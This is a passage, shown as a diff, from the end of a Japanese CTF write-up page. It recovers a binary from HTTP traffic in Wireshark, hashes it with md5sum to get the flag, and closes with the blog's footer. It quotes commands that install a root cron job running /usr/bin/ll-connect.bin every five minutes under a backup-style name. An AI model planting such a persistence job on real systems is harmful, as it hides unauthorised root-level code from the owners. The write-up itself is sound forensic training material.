+sudo chmod 755 /usr/bin/ll-connect.bin
+sudo /bin/bash -c "echo '*/5 * * * * root /usr/bin/ll-connect.bin' > /etc/cron.d/da-ll-backup-job"
+
+cat /etc/cron.d/da-ll-backup-job
+*/5 * * * * root /usr/bin/ll-connect.bin
+
+</pre>
+<p>Wiresharkから、http通信の中のファイルをexportします。Content-Type: application/octet-stream のやつを探すと見つかりやすいです。</p>
+<br>
+<pre>
+$ md5sum secret_decoder.bin
+42e419a6391ca79dc44d7dcef1efc83b  secret_decoder.bin
+</pre>
+<br>
+<p>Flag: <code>flag{42e419a6391ca79dc44d7dcef1efc83b}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-10-17
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/">
+            <span class="next-text nav-default">Digital Overdose 2021 Autumn CTF Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
